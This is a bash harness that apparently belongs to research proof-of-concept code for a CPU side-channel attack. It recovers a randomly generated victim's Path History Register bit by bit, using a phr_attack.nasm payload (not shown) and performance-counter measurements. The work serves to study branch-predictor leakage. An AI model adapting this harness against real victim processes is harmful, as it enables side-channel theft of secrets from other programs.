#!/bin/bash

# Define Assembler
ass=nasm

# Making required folders
if [ ! -d "./bin" ]; then
    mkdir "./bin"
fi
if [ ! -d "./results" ]; then
    mkdir "./results"
fi

# Remove Extracted PHR file
rm Extracted_PHR.csv

RESULTS_DIR="./results"

# Code to initialize environment variables inside test scripts
(cd .. && . vars.sh)

# Performance Counters.
cts=207

# Compile PMCTestA and phr_maker files
if [ ../PMCTestA.cpp -nt ./bin/a64.o ] ; then
  g++ -O2 -c -m64 -o./bin/a64.o ../PMCTestA.cpp
fi
if [ ./phr_maker.c -nt ./bin/phr_maker.o ] ; then
  gcc phr_maker.c -o ./bin/phr_maker.o
fi
if [ ./victim_phr_maker.c -nt ./bin/victim_phr_maker.o ] ; then
  gcc victim_phr_maker.c -o ./bin/victim_phr_maker.o
fi

# Initialize the PHR Model
for i in {0..193..1}
do
  PHR_Model[$i]=0
done

# Initialize the Victim PHR Model
for i in {0..193..1}
do
  Victim_PHR_Model[$i]=$(($RANDOM%4))
done
./bin/victim_phr_maker.o ${Victim_PHR_Model[@]} > victim_phr_model_init.nasm
echo "${Victim_PHR_Model[@]}" > Victim_PHR_Model.csv

# ********************************************************
for phr_bit in {193..2..1}
do
start_time=$(date +%s.%N)
# --------------------------------------------------------
# phr_read function
  extracted_bit=4
  while [ $extracted_bit -eq 4 ]
  do
    # ------------------- Trying 4 possible values of the PHR -------------
    for i in {0..3..1}
    do
      (
        # Set PHR bit
        PHR_Model[193]=$i

        # Generate PHR MODEL Macro
        taskset -c $((i*2)) ./bin/phr_maker.o ${PHR_Model[@]} > ./bin/phr_model_init_$i.nasm

        # Compile nasm file.
        taskset -c $((i*2)) $ass -f elf64 -o /tmp/b64_$i.o -i../ -i./ \
          -Dcounters=$cts \
          -Dvar=$phr_bit \
          -P./phr_attack.nasm \
          -P./bin/phr_model_init_$i.nasm \
          ../TemplateB64.nasm
        
        # Link the A and B files.
        if [ $? -ne 0 ] ; then exit ; fi
        taskset -c $((i*2)) g++ -m64 ./bin/a64.o /tmp/b64_$i.o -o/tmp/x_$i -lpthread

        # Running the actual test. 
        if [ $? -ne 0 ] ; then exit ; fi
        taskset -c $((i*2)) /tmp/x_$i > $RESULTS_DIR/results_${i}.csv
      ) &
    done

    wait

    for i in {0..3..1}
    do
      sum=$(ps -ef | grep "port 10 -" | grep -v "grep port 10 -"| awk -F " " 'END { print s } { s += $2 }' ./results/results_${i}.csv)
      if [ $sum -gt 850 ]; then 
        index=$((193-$phr_bit))
        echo -e "\e[1;34m PHR[$index] = $i \e[0m"
        echo -e "PHR[$index] = $i" >> Extracted_PHR.csv
        extracted_bit=$i
        break
      else 
        continue
      fi
    done
    # -------------------------------------------------------------------
  done

  # Modify the PHR Model
  start=$(($phr_bit-2))
  end=191
  for (( c=$start; c<=$end; c++ ))
  do
    j=$(($c+1))
    PHR_Model[$c]=${PHR_Model[$j]}
  done
  PHR_Model[192]=$extracted_bit
  PHR_Model[193]=0
  # echo "${PHR_Model[@]}"
# --------------------------------------------------------
end_time=$(date +%s.%N)
runtime=$( echo "$end_time - $start_time" | bc -l )
echo "Elapsed time: $runtime seconds"
done
# ********************************************************

# Save the extracted PHR!
echo ${PHR_Model[@]} > ./results/PHR_Model.csv
